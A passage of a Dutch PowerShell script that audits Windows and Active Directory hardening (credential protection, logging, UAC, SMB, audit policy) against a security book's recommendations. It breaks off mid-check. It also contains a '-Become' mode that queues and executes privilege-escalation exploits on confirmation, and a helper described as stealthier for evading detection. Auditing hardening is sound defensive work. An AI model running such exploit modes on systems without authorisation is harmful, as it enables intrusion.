<#
.SYNOPSIS
    Controleert beveiligingsaanbevelingen uit "Incompetent Bastards: Het Netwerk"
    Werkt volledig met LOLBins -- geen RSAT, geen externe tooling.

.DESCRIPTION
    Dit script controleert aanbevelingen op een lokale Windows-host en optioneel
    tegen Active Directory, zonder afhankelijkheden van de ActiveDirectory
    PowerShell-module of externe tools. Alle AD-queries gebruiken
    [System.DirectoryServices] (.NET LDAP). Geschikt voor gehardende omgevingen.

    Lokale checks:
    - Credential bescherming (Credential Guard, LSA, WDigest)
    - PowerShell hardening (v2, logging, CLM)
    - Privilege escalatie (UAC, AlwaysInstallElevated, unquoted paths)
    - Laterale beweging preventie (firewall, Sysmon)
    - Service hardening (Print Spooler, SMB signing, DSRM, LSA packages)
    - Audit policy en wachtwoordbeleid

    AD checks (-IncludeAD):
    - Machine Account Quota, Protected Users, LAPS
    - AS-REP Roastable, Kerberoastable, Unconstrained Delegation
    - Wachtwoorden in description, SIDHistory, AdminSDHolder ACL

    ADCS checks (-IncludeADCS):
    - EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6)
    - ESC1 kwetsbare templates

    Privesc scan (-IncludePrivesc):
    - Writable service binaries, weak service DACLs
    - Scheduled tasks met writable paden
    - Autorun registry entries, stored credentials
    - Gevaarlijke token privileges, named pipes
    - GPP passwords, DLL hijack via PATH
    - Print Spooler / PrintNightmare, Potato attack vector
    - AD privesc: RBCD, delegation, AS-REP, LAPS (indien -IncludeAD)

.EXAMPLE
    .\Check-Aanbevelingen-LOLBin.ps1
    .\Check-Aanbevelingen-LOLBin.ps1 -IncludeAD
    .\Check-Aanbevelingen-LOLBin.ps1 -IncludeAD -IncludeADCS
    .\Check-Aanbevelingen-LOLBin.ps1 -IncludePrivesc
    .\Check-Aanbevelingen-LOLBin.ps1 -IncludeAD -IncludePrivesc

.NOTES
    Vereist: PowerShell 5.1+, sommige checks vereisen lokale admin-rechten.
    AD checks vereisen een domain-joined machine (geen RSAT nodig).
#>

[CmdletBinding()]
param(
    [switch]$IncludeAD,
    [switch]$IncludeADCS,
    [switch]$IncludePrivesc,
    [switch]$Become,
    [string]$OutputFile = "",
    [int]$ServiceDACLLimit = 100,
    [string]$Agent = ""
)

if ($Become) { $IncludePrivesc = $true }
$Script:BecomeExploits = [System.Collections.ArrayList]::new()

function Add-BecomeExploit {
    param([int]$Priority, [string]$Type, [string]$Description, [scriptblock]$Command, [string]$CommandText)
    if ($Become) {
        [void]$Script:BecomeExploits.Add([PSCustomObject]@{
            Priority    = $Priority
            Type        = $Type
            Description = $Description
            Command     = $Command
            CommandText = $CommandText
        })
    }
}

function Invoke-Become {
    if ($Script:BecomeExploits.Count -eq 0) {
        Write-Host "`n  [BECOME] Geen exploiteerbare vectoren gevonden." -ForegroundColor Red
        return
    }

    $sorted = $Script:BecomeExploits | Sort-Object Priority

    Write-Host ""
    Write-Host "  ██████████████████████████████████████████████████████████" -ForegroundColor Red
    Write-Host "  ██  WAARSCHUWING: -Become modus is DESTRUCTIEF!        ██" -ForegroundColor Red
    Write-Host "  ██  Dit voert daadwerkelijk exploits uit.               ██" -ForegroundColor Red
    Write-Host "  ██  Alleen gebruiken met expliciete autorisatie!        ██" -ForegroundColor Red
    Write-Host "  ██████████████████████████████████████████████████████████" -ForegroundColor Red

    Write-Host "`n  ╔══════════════════════════════════════════╗" -ForegroundColor Yellow
    Write-Host "  ║         BECOME -- Exploit Vectoren         ║" -ForegroundColor Yellow
    Write-Host "  ╚══════════════════════════════════════════╝`n" -ForegroundColor Yellow

    $i = 1
    foreach ($e in $sorted) {
        Write-Host "  [$i] [$($e.Type)] $($e.Description)" -ForegroundColor Green
        Write-Host "      → $($e.CommandText)" -ForegroundColor Cyan
        $i++
    }

    $best = $sorted[0]
    Write-Host "`n  [BECOME] Beste vector: [$($best.Type)] $($best.Description)" -ForegroundColor Yellow
    $keuze = Read-Host "  [BECOME] Uitvoeren? [j/N/nummer]"

    if ($keuze -match '^\d+$') {
        $idx = [int]$keuze - 1
        if ($idx -ge 0 -and $idx -lt $sorted.Count) {
            $selected = $sorted[$idx]
            Write-Host "  [BECOME] Uitvoeren: $($selected.Description)" -ForegroundColor Green
            & $selected.Command
        } else {
            Write-Host "  [BECOME] Ongeldige keuze." -ForegroundColor Red
        }
    } elseif ($keuze -match '^[jJyY]$') {
        Write-Host "  [BECOME] Uitvoeren: $($best.Description)" -ForegroundColor Green
        & $best.Command
    } else {
        Write-Host "  [BECOME] Afgebroken." -ForegroundColor Red
    }
}

# ── Variabelen ──────────────────────────────────────────────────

$Script:PassCount = 0
$Script:FailCount = 0
$Script:WarnCount = 0
$Script:InfoCount = 0
$Script:SkipCount = 0

$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# ── OutputFile initialisatie ────────────────────────────────────

if ($OutputFile) {
    # Maak leeg of maak aan
    "" | Set-Content -Path $OutputFile -Encoding UTF8
    $Script:OutputFile = $OutputFile
} else {
    $Script:OutputFile = ""
}

function Write-ToFile {
    param([string]$Line)
    if ($Script:OutputFile) {
        $Line | Out-File -FilePath $Script:OutputFile -Append -Encoding UTF8
    }
}

# ── Hulpfuncties ────────────────────────────────────────────────

function Write-Pass  { param([string]$Msg) $Script:PassCount++; Write-Host "  [PASS] $Msg" -ForegroundColor Green; Write-ToFile "  [PASS] $Msg" }
function Write-Fail  { param([string]$Msg) $Script:FailCount++; Write-Host "  [FAIL] $Msg" -ForegroundColor Red; Write-ToFile "  [FAIL] $Msg" }
function Write-Warn  { param([string]$Msg) $Script:WarnCount++; Write-Host "  [WARN] $Msg" -ForegroundColor Yellow; Write-ToFile "  [WARN] $Msg" }
function Write-Info  { param([string]$Msg) $Script:InfoCount++; Write-Host "  [INFO] $Msg" -ForegroundColor Cyan; Write-ToFile "  [INFO] $Msg" }
function Write-Skip  { param([string]$Msg) $Script:SkipCount++; Write-Host "  [SKIP] $Msg" -ForegroundColor DarkGray; Write-ToFile "  [SKIP] $Msg" }

function Write-Section    { param([string]$Msg) Write-Host "`n=== $Msg ===" -ForegroundColor White -BackgroundColor DarkBlue }
function Write-SubSection { param([string]$Msg) Write-Host "`n  -- $Msg" -ForegroundColor White }

function Get-RegValue {
    param([string]$Path, [string]$Name)
    try {
        $val = Get-ItemProperty -Path $Path -Name $Name -ErrorAction Stop
        return $val.$Name
    } catch {
        return $null
    }
}

function Invoke-WithTimeout {
    <#
    .SYNOPSIS
        Voert een scriptblock uit in een in-process runspace met timeout.
        Stealthier dan Start-Job (geen child process).
    #>
    param(
        [scriptblock]$ScriptBlock,
        [int]$TimeoutSeconds = 15,
        [string]$Description = "Commando"
    )
    try {
        $runspace = [runspacefactory]::CreateRunspace()
        $runspace.Open()
        $ps = [powershell]::Create()
        $ps.Runspace = $runspace
        [void]$ps.AddScript($ScriptBlock)
        $handle = $ps.BeginInvoke()
        if ($handle.AsyncWaitHandle.WaitOne([TimeSpan]::FromSeconds($TimeoutSeconds))) {
            $result = $ps.EndInvoke($handle)
            $ps.Dispose()
            $runspace.Close()
            return $result
        } else {
            $ps.Stop()
            $ps.Dispose()
            $runspace.Close()
            Write-Warn "$Description : timeout na ${TimeoutSeconds}s"
            return $null
        }
    } catch {
        Write-Warn "$Description : fout - $_"
        return $null
    }
}

function New-LdapSearcher {
    <#
    .SYNOPSIS
        Maakt een [DirectorySearcher] met ingebouwde timeouts.
        Geen AD-module nodig -- puur .NET.
    #>
    param(
        [string]$SearchRoot,
        [string]$Filter,
        [string[]]$Properties,
        [int]$TimeoutSeconds = 15,
        [int]$SizeLimit = 5000
    )
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    if ($SearchRoot) {
        $searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($SearchRoot)
    }
    $searcher.Filter = $Filter
    $searcher.PageSize = 1000
    $searcher.SizeLimit = $SizeLimit
    $searcher.ServerTimeLimit = [TimeSpan]::FromSeconds($TimeoutSeconds)
    $searcher.ClientTimeout   = [TimeSpan]::FromSeconds($TimeoutSeconds + 5)
    foreach ($p in $Properties) { [void]$searcher.PropertiesToLoad.Add($p) }
    return $searcher
}

# ── Banner ──────────────────────────────────────────────────────

Write-Host ""
Write-Host "  +============================================================+" -ForegroundColor White
Write-Host "  |  Incompetent Bastards - Aanbevelingen Checker (LOLBin)     |" -ForegroundColor White
Write-Host "  |  Geen RSAT, geen externe tooling - puur .NET / WMI / reg   |" -ForegroundColor White
Write-Host "  +============================================================+" -ForegroundColor White
Write-Host "  Datum:  $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
Write-Host "  Host:   $env:COMPUTERNAME"
Write-Host "  OS:     $((Get-CimInstance Win32_OperatingSystem).Caption)"
Write-Host "  Admin:  $IsAdmin"
Write-Host "  Domain: $(if ($env:USERDNSDOMAIN) { $env:USERDNSDOMAIN } else { '(niet domain-joined)' })"

if (-not $IsAdmin) {
    Write-Host "`n  WAARSCHUWING: Niet als administrator. Sommige checks worden overgeslagen.`n" -ForegroundColor Yellow
}

# ═════════════════════════════════════════════════════════════════
# SECTIE 1: CREDENTIAL BESCHERMING (Hfst. 6, 10)
# ═════════════════════════════════════════════════════════════════

Write-Section "CREDENTIAL BESCHERMING (Hfst. 6, 10)"

# ── Credential Guard ─────────────────────────────────────────
Write-SubSection "Credential Guard"

try {
    $dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction Stop
    $secServices = $dg.SecurityServicesRunning
    if ($secServices -contains 1) {
        Write-Pass "Credential Guard is actief"
    } else {
        Write-Fail "Credential Guard is NIET actief"
    }
    if ($secServices -contains 2) {
        Write-Pass "HVCI (Hypervisor Code Integrity) is actief"
    } else {
        Write-Warn "HVCI is niet actief"
    }
} catch {
    Write-Warn "Device Guard informatie niet beschikbaar"
}

# ── LSA Protection (RunAsPPL) ────────────────────────────────
Write-SubSection "LSA Protection"

$runAsPPL = Get-RegValue "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" "RunAsPPL"
if ($runAsPPL -eq 1) {
    Write-Pass "LSA Protection (RunAsPPL) is ingeschakeld"
} elseif ($null -eq $runAsPPL) {
    Write-Fail "LSA Protection (RunAsPPL) is niet geconfigureerd"
} else {
    Write-Fail "LSA Protection (RunAsPPL) = $runAsPPL (moet 1 zijn)"
}

# ── WDigest ──────────────────────────────────────────────────
Write-SubSection "WDigest"

$wdigest = Get-RegValue "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" "UseLogonCredential"
if ($wdigest -eq 0) {
    Write-Pass "WDigest is uitgeschakeld (UseLogonCredential = 0)"
} elseif ($null -eq $wdigest) {
    Write-Pass "WDigest UseLogonCredential niet ingesteld (default: uitgeschakeld op Win 8.1+)"
} else {
    Write-Fail "WDigest is INGESCHAKELD (UseLogonCredential = $wdigest)"
}

# ═════════════════════════════════════════════════════════════════
# SECTIE 2: EVASION HARDENING (Hfst. 4)
# ═════════════════════════════════════════════════════════════════

Write-Section "EVASION HARDENING (Hfst. 4)"

# ── PowerShell v2 ────────────────────────────────────────────
Write-SubSection "PowerShell v2"

try {
    $psv2 = Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -ErrorAction Stop
    if ($psv2.State -eq "Disabled") {
        Write-Pass "PowerShell v2 is uitgeschakeld"
    } else {
        Write-Fail "PowerShell v2 is INGESCHAKELD (moet uitgeschakeld worden)"
    }
} catch {
    if (-not $IsAdmin) {
        Write-Skip "PowerShell v2 check vereist admin-rechten"
    } else {
        Write-Warn "PowerShell v2 status niet opvraagbaar"
    }
}

# ── PowerShell Logging ───────────────────────────────────────
Write-SubSection "PowerShell Logging"

$sbl = Get-RegValue "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" "EnableScriptBlockLogging"
if ($sbl -eq 1) {
    Write-Pass "PowerShell Script Block Logging is ingeschakeld"
} else {
    Write-Fail "PowerShell Script Block Logging is NIET ingeschakeld"
}

$ml = Get-RegValue "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" "EnableModuleLogging"
if ($ml -eq 1) {
    Write-Pass "PowerShell Module Logging is ingeschakeld"
} else {
    Write-Warn "PowerShell Module Logging is niet ingeschakeld"
}

$execPolicy = Get-ExecutionPolicy
if ($execPolicy -eq "AllSigned") {
    Write-Pass "ExecutionPolicy = AllSigned"
} elseif ($execPolicy -eq "RemoteSigned") {
    Write-Warn "ExecutionPolicy = RemoteSigned (aanbevolen: AllSigned)"
} else {
    Write-Warn "ExecutionPolicy = $execPolicy"
}

# Transcription Logging
$transcription = Get-RegValue "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" "EnableTranscripting"
if ($transcription -eq 1) {
    Write-Pass "PowerShell Transcription Logging is ingeschakeld"
} else {
    Write-Warn "PowerShell Transcription Logging is niet ingeschakeld"
}

# ── Constrained Language Mode ────────────────────────────────
Write-SubSection "Language Mode"

if ($ExecutionContext.SessionState.LanguageMode -eq "ConstrainedLanguage") {
    Write-Pass "PowerShell draait in Constrained Language Mode"
} else {
    Write-Info "PowerShell draait in $($ExecutionContext.SessionState.LanguageMode) mode"
}

# ── WDAC / AppLocker ────────────────────────────────────────
Write-SubSection "Application Whitelisting"

# AppLocker
try {
    $applockerSvc = Get-Service -Name AppIDSvc -ErrorAction Stop
    if ($applockerSvc.Status -eq "Running") {
        Write-Pass "AppLocker service (AppIDSvc) draait"
    } else {
        Write-Info "AppLocker service geinstalleerd maar niet actief"
    }
} catch {
    Write-Info "AppLocker service niet gevonden"
}

# WDAC (via CIM)
try {
    $ciPolicy = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction Stop
    if ($ciPolicy.CodeIntegrityPolicyEnforcementStatus -eq 2) {
        Write-Pass "WDAC Code Integrity policy is enforced"
    } elseif ($ciPolicy.CodeIntegrityPolicyEnforcementStatus -eq 1) {
        Write-Warn "WDAC Code Integrity policy is in audit mode"
    } else {
        Write-Info "WDAC Code Integrity policy niet actief"
    }
} catch {
    Write-Info "WDAC status niet opvraagbaar"
}

# ═════════════════════════════════════════════════════════════════
# SECTIE 3: PRIVILEGE ESCALATIE HARDENING (Hfst. 6)
# ═════════════════════════════════════════════════════════════════

Write-Section "PRIVILEGE ESCALATIE HARDENING (Hfst. 6)"

# ── UAC ──────────────────────────────────────────────────────
Write-SubSection "UAC Configuratie"

$enableLUA = Get-RegValue "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" "EnableLUA"
$consentPrompt = Get-RegValue "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" "ConsentPromptBehaviorAdmin"

if ($enableLUA -eq 1) {
    Write-Pass "UAC is ingeschakeld"
} else {
    Write-Fail "UAC is UITGESCHAKELD"
}

if ($consentPrompt -eq 2) {
    Write-Pass "UAC prompt voor admins: Always Notify (veiligste)"
} elseif ($consentPrompt -eq 5) {
    Write-Warn "UAC prompt voor admins: Prompt for consent (default, niet de veiligste)"
} else {
    Write-Warn "UAC ConsentPromptBehaviorAdmin = $consentPrompt"
}

# FilterAdministratorToken
$filterAdmin = Get-RegValue "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" "FilterAdministratorToken"
if ($filterAdmin -eq 1) {
    Write-Pass "FilterAdministratorToken is ingeschakeld (built-in admin heeft UAC)"
} else {
    Write-Warn "FilterAdministratorToken niet ingesteld (built-in Administrator omzeilt UAC)"
}

# ── AlwaysInstallElevated ────────────────────────────────────
Write-SubSection "AlwaysInstallElevated"

$aie_hklm = Get-RegValue "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" "AlwaysInstallElevated"
$aie_hkcu = Get-RegValue "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" "AlwaysInstallElevated"

if ($aie_hklm -eq 1 -and $aie_hkcu -eq 1) {
    Write-Fail "AlwaysInstallElevated is INGESCHAKELD (privesc risico!)"
} else {
    Write-Pass "AlwaysInstallElevated is niet ingeschakeld"
}

# ── Unquoted Service Paths ───────────────────────────────────
Write-SubSection "Unquoted Service Paths"

if ($IsAdmin) {
    $services = Get-CimInstance Win32_Service | Where-Object {
        $_.PathName -and
        $_.PathName -notlike '"*' -and
        $_.PathName -like '* *' -and
        $_.PathName -notlike 'C:\Windows\*'
    }
    if ($services) {
        Write-Fail "$($services.Count) service(s) met unquoted paths gevonden"
        $services | Select-Object -First 5 | ForEach-Object {
            Write-Host "         $($_.Name): $($_.PathName)" -ForegroundColor DarkGray
        }
    } else {
        Write-Pass "Geen unquoted service paths gevonden"
    }
} else {
    Write-Skip "Unquoted service path check vereist admin-rechten"
}

# ── SeImpersonatePrivilege ───────────────────────────────────
Write-SubSection "Token Privileges"

$whoamiPriv = whoami /priv 2>$null
if ($whoamiPriv -match "SeImpersonatePrivilege") {
    Write-Warn "SeImpersonatePrivilege is toegekend aan huidige gebruiker"
} else {
    Write-Pass "SeImpersonatePrivilege niet toegekend aan huidige gebruiker"
}
if ($whoamiPriv -match "SeDebugPrivilege") {
    Write-Warn "SeDebugPrivilege is toegekend (kan processen dumpen)"
} else {
    Write-Pass "SeDebugPrivilege niet toegekend"
}

# ═════════════════════════════════════════════════════════════════
# SECTIE 4: LATERALE BEWEGING (Hfst. 9)
# ═════════════════════════════════════════════════════════════════

Write-Section "LATERALE BEWEGING PREVENTIE (Hfst. 9)"

# ── Windows Firewall inbound regels ──────────────────────────
Write-SubSection "Windows Firewall - Inbound Blokkades"

if ($IsAdmin) {
    $fwProfiles = Get-NetFirewallProfile -ErrorAction SilentlyContinue
    foreach ($profile in $fwProfiles) {
        if ($profile.Enabled) {
            Write-Pass "Firewall profiel '$($profile.Name)' is ingeschakeld"
        } else {
            Write-Fail "Firewall profiel '$($profile.Name)' is UITGESCHAKELD"
        }
    }

    # SMB (445)
    $smb_block = Get-NetFirewallRule -Direction Inbound -ErrorAction SilentlyContinue |
        Where-Object { $_.Enabled -eq $true -and $_.Action -eq "Block" } |
        Get-NetFirewallPortFilter -ErrorAction SilentlyContinue |
        Where-Object { $_.LocalPort -eq 445 }
    if ($smb_block) {
        Write-Pass "SMB (445) inbound is geblokkeerd"
    } else {
        Write-Warn "Geen expliciete blokkade voor SMB (445) inbound"
    }

    # WinRM (5985/5986)
    $winrm_block = Get-NetFirewallRule -Direction Inbound -ErrorAction SilentlyContinue |
        Where-Object { $_.Enabled -eq $true -and $_.Action -eq "Block" } |
        Get-NetFirewallPortFilter -ErrorAction SilentlyContinue |
        Where-Object { $_.LocalPort -in @(5985, 5986) }
    if ($winrm_block) {
        Write-Pass "WinRM (5985/5986) inbound is geblokkeerd"
    } else {
        Write-Warn "Geen expliciete blokkade voor WinRM (5985/5986) inbound"
    }

    # RPC (135)
    $rpc_block = Get-NetFirewallRule -Direction Inbound -ErrorAction SilentlyContinue |
        Where-Object { $_.Enabled -eq $true -and $_.Action -eq "Block" } |
        Get-NetFirewallPortFilter -ErrorAction SilentlyContinue |
        Where-Object { $_.LocalPort -eq 135 }
    if ($rpc_block) {
        Write-Pass "RPC (135) inbound is geblokkeerd"
    } else {
        Write-Warn "Geen expliciete blokkade voor RPC (135) inbound"
    }
} else {
    Write-Skip "Firewall checks vereisen admin-rechten"
}

# ── Sysmon ───────────────────────────────────────────────────
Write-SubSection "Sysmon"

$sysmonService = Get-Service -Name Sysmon* -ErrorAction SilentlyContinue
if ($sysmonService -and $sysmonService.Status -eq "Running") {
    Write-Pass "Sysmon is actief: $($sysmonService.DisplayName)"
} elseif ($sysmonService) {
    Write-Warn "Sysmon is geinstalleerd maar niet actief"
} else {
    Write-Fail "Sysmon is NIET geinstalleerd"
}

# ── Windows Event Forwarding ─────────────────────────────────
Write-SubSection "Windows Event Forwarding"

$wecSvc = Get-Service -Name Wecsvc -ErrorAction SilentlyContinue
if ($wecSvc -and $wecSvc.Status -eq "Running") {
    Write-Pass "Windows Event Collector service draait"
} else {
    Write-Info "Windows Event Collector (Wecsvc) niet actief"
}

# ═════════════════════════════════════════════════════════════════
# SECTIE 5: SERVICE HARDENING (Hfst. 8, 12)
# ═════════════════════════════════════════════════════════════════

Write-Section "SERVICE HARDENING (Hfst. 8, 12)"

# ── Print Spooler ────────────────────────────────────────────
Write-SubSection "Print Spooler"

$spooler = Get-Service -Name Spooler -ErrorAction SilentlyContinue
if ($spooler) {
    if ($spooler.Status -eq "Running") {
        $isDC = (Get-CimInstance Win32_ComputerSystem).DomainRole -ge 4
        if ($isDC) {
            Write-Fail "Print Spooler draait op een Domain Controller (Printer Bug risico!)"
        } else {
            Write-Warn "Print Spooler draait (overweeg uitschakelen als niet nodig)"
        }
    } else {
        Write-Pass "Print Spooler is gestopt"
    }
    if ($spooler.StartType -eq "Disabled") {
        Write-Pass "Print Spooler startup type: Disabled"
    } else {
        Write-Info "Print Spooler startup type: $($spooler.StartType)"
    }
} else {
    Write-Pass "Print Spooler service niet gevonden"
}

# ── SMB Signing ──────────────────────────────────────────────
Write-SubSection "SMB Signing"

$smbSignReq = Get-RegValue "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" "RequireSecuritySignature"
if ($smbSignReq -eq 1) {
    Write-Pass "SMB Server signing is vereist"
} else {
    Write-Fail "SMB Server signing is NIET vereist"
}

$smbClientSign = Get-RegValue "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" "RequireSecuritySignature"
if ($smbClientSign -eq 1) {
    Write-Pass "SMB Client signing is vereist"
} else {
    Write-Warn "SMB Client signing is niet vereist"
}

# SMBv1
$smbv1 = Get-RegValue "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" "SMB1"
if ($smbv1 -eq 0) {
    Write-Pass "SMBv1 is uitgeschakeld"
} elseif ($null -eq $smbv1) {
    Write-Warn "SMBv1 registrywaarde niet ingesteld (controleer via Get-SmbServerConfiguration)"
} else {
    Write-Fail "SMBv1 is INGESCHAKELD"
}

# ── DSRM ─────────────────────────────────────────────────────
Write-SubSection "DSRM Backdoor Check"

$dsrmBehavior = Get-RegValue "HKLM:\System\CurrentControlSet\Control\Lsa" "DsrmAdminLogonBehavior"
if ($null -eq $dsrmBehavior -or $dsrmBehavior -eq 0) {
    Write-Pass "DsrmAdminLogonBehavior niet ingesteld of 0 (veilig)"
} elseif ($dsrmBehavior -eq 2) {
    Write-Fail "DsrmAdminLogonBehavior = 2 (DSRM backdoor mogelijk actief!)"
} else {
    Write-Warn "DsrmAdminLogonBehavior = $dsrmBehavior"
}

# ── LSA Security Packages ───────────────────────────────────
Write-SubSection "LSA Security Packages (Custom SSP Check)"

$secPkgs = Get-RegValue "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" "Security Packages"
$knownPkgs = @("", "kerberos", "msv1_0", "msv2_0", "schannel", "wdigest", "tspkg", "pku2u", "cloudAP")
$unknownPkgs = $secPkgs | Where-Object { $_ -notin $knownPkgs }
if ($unknownPkgs) {
    Write-Fail "Onbekende LSA Security Packages gevonden: $($unknownPkgs -join ', ')"
} else {
    Write-Pass "Alleen bekende LSA Security Packages geconfigureerd"
}

# ── LLMNR / NBT-NS / mDNS ───────────────────────────────────
Write-SubSection "Naam-resolutie Poisoning"

$llmnr = Get-RegValue "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" "EnableMulticast"
if ($llmnr -eq 0) {
    Write-Pass "LLMNR is uitgeschakeld via GPO"
} else {
    Write-Warn "LLMNR is niet uitgeschakeld (Responder/poisoning risico)"
}

# NBT-NS: controleer alle NICs
$nbtns_enabled = $false
$adapters = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces" -ErrorAction SilentlyContinue
foreach ($adapter in $adapters) {
    $nbtOpt = Get-RegValue $adapter.PSPath "NetbiosOptions"
    if ($null -eq $nbtOpt -or $nbtOpt -ne 2) {
        $nbtns_enabled = $true
        break
    }
}
if ($nbtns_enabled) {
    Write-Warn "NetBIOS over TCP/IP is ingeschakeld op een of meer adapters"
} else {
    Write-Pass "NetBIOS over TCP/IP is uitgeschakeld op alle adapters"
}

# ═════════════════════════════════════════════════════════════════
# SECTIE 6: AUDIT & WACHTWOORDBELEID (LOLBin: auditpol, net)
# ═════════════════════════════════════════════════════════════════

Write-Section "AUDIT & WACHTWOORDBELEID"

# ── Audit Policy via auditpol ────────────────────────────────
Write-SubSection "Audit Policy (kritieke categorieen)"

if ($IsAdmin) {
    $auditOutput = auditpol /get /category:* 2>$null
    if ($auditOutput) {
        $criticalAudits = @{
            "Logon"              = "Logon/Logoff"
            "Credential Validation" = "Account Logon"
            "Process Creation"   = "Detailed Tracking"
            "Security Group Management" = "Account Management"
            "User Account Management"   = "Account Management"
        }
        foreach ($audit in $criticalAudits.GetEnumerator()) {
            $line = $auditOutput | Where-Object { $_ -match $audit.Key }
            if ($line -match "Success and Failure") {
                Write-Pass "$($audit.Key): Success and Failure"
            } elseif ($line -match "Success") {
                Write-Warn "$($audit.Key): alleen Success (voeg Failure toe)"
            } elseif ($line -match "No Auditing") {
                Write-Fail "$($audit.Key): NIET geaudit"
            } else {
                Write-Info "$($audit.Key): $($line -replace '^\s+','')"
            }
        }
    } else {
        Write-Skip "auditpol niet beschikbaar"
    }
} else {
    Write-Skip "Audit policy check vereist admin-rechten"
}

# ── Wachtwoordbeleid via net accounts ─────────────────────────
Write-SubSection "Lokaal Wachtwoordbeleid"

$netAccounts = net accounts 2>$null
if ($netAccounts) {
    # Lockout threshold
    $lockoutLine = $netAccounts | Where-Object { $_ -match "Lockout threshold" }
    if ($lockoutLine -match "(\d+)") {
        $lockoutThreshold = [int]$Matches[1]
        if ($lockoutThreshold -eq 0) {
            Write-Fail "Account lockout is UITGESCHAKELD (lockout threshold = 0)"
        } elseif ($lockoutThreshold -le 5) {
            Write-Pass "Account lockout threshold: $lockoutThreshold"
        } else {
            Write-Warn "Account lockout threshold: $lockoutThreshold (aanbevolen: <= 5)"
        }
    }

    # Min password length
    $minLenLine = $netAccounts | Where-Object { $_ -match "Minimum password length" }
    if ($minLenLine -match "(\d+)") {
        $minLen = [int]$Matches[1]
        if ($minLen -ge 14) {
            Write-Pass "Minimale wachtwoordlengte: $minLen"
        } elseif ($minLen -ge 8) {
            Write-Warn "Minimale wachtwoordlengte: $minLen (aanbevolen: >= 14)"
        } else {
            Write-Fail "Minimale wachtwoordlengte: $minLen (te kort!)"
        }
    }

    # Max password age
    $maxAgeLine = $netAccounts | Where-Object { $_ -match "Maximum password age" }
    if ($maxAgeLine -match "(\d+)") {
        $maxAge = [int]$Matches[1]
        Write-Info "Maximale wachtwoordleeftijd: $maxAge dagen"
    }
}

# ═════════════════════════════════════════════════════════════════
# SECTIE 7: ACTIVE DIRECTORY via .NET LDAP (Hfst. 5, 7, 8, 11)
# Geen RSAT nodig -- [System.DirectoryServices] only
# ═════════════════════════════════════════════════════════════════

if ($IncludeAD) {

    Write-Section "ACTIVE DIRECTORY via .NET LDAP (Hfst. 5, 7, 8, 11)"

    # ── Domein detectie en LDAP-verbinding ───────────────────────
    Write-SubSection "LDAP Verbinding"

    $domainName = $env:USERDNSDOMAIN
    if (-not $domainName) {
        Write-Fail "Machine is niet domain-joined -- AD checks niet mogelijk"
    } else {
        # RootDSE ophalen (lightweight, snel)
        $baseDN   = $null
        $configDN = $null
        try {
            $rootDSE  = New-Object System.DirectoryServices.DirectoryEntry("LDAP://RootDSE")
            $baseDN   = $rootDSE.Properties["defaultNamingContext"][0]
            $configDN = $rootDSE.Properties["configurationNamingContext"][0]
            $schemaDN = $rootDSE.Properties["schemaNamingContext"][0]
            Write-Pass "LDAP verbinding OK -- BaseDN: $baseDN"
        } catch {
            Write-Fail "Kan geen verbinding maken met LDAP: $_"
        }
    }

    if ($baseDN) {

        # ── Machine Account Quota ────────────────────────────────
        Write-SubSection "Machine Account Quota"

        try {
            $s = New-LdapSearcher -SearchRoot "LDAP://$baseDN" `
                -Filter "(objectClass=domain)" `
                -Properties @("ms-DS-MachineAccountQuota") `
                -TimeoutSeconds 10
            $s.SearchScope = [System.DirectoryServices.SearchScope]::Base
            $r = $s.FindOne()
            $maq = $r.Properties["ms-ds-machineaccountquota"][0]
            if ($maq -eq 0) {
                Write-Pass "ms-DS-MachineAccountQuota = 0"
            } else {
                Write-Fail "ms-DS-MachineAccountQuota = $maq (moet 0 zijn)"
            }
        } catch {
            Write-Warn "Machine Account Quota niet opvraagbaar: $_"
        }

        # ── Protected Users ──────────────────────────────────────
        Write-SubSection "Protected Users Groep"

        try {
            $s = New-LdapSearcher -SearchRoot "LDAP://$baseDN" `
                -Filter "(&(objectClass=group)(cn=Protected Users))" `
                -Properties @("member") `
                -TimeoutSeconds 15
            $r = $s.FindOne()
            $puMembers = $r.Properties["member"]
            if ($puMembers.Count -gt 0) {
                Write-Pass "Protected Users groep heeft $($puMembers.Count) lid/leden"

                # Haal Domain Admins op
                $s2 = New-LdapSearcher -SearchRoot "LDAP://$baseDN" `
                    -Filter "(&(objectClass=group)(cn=Domain Admins))" `
                    -Properties @("member") `
                    -TimeoutSeconds 15
                $r2 = $s2.FindOne()
                $daMembers = $r2.Properties["member"]

                $daNotInPU = @()
                foreach ($da in $daMembers) {
                    if ($da -notin $puMembers) {
                        # Haal CN uit DN
                        $cn = ($da -split ',')[0] -replace '^CN=',''
                        $daNotInPU += $cn
                    }
                }
                if ($daNotInPU.Count -gt 0) {
                    Write-Warn "$($daNotInPU.Count) Domain Admin(s) NIET in Protected Users:"
                    $daNotInPU | ForEach-Object { Write-Host "         $_" -ForegroundColor DarkGray }
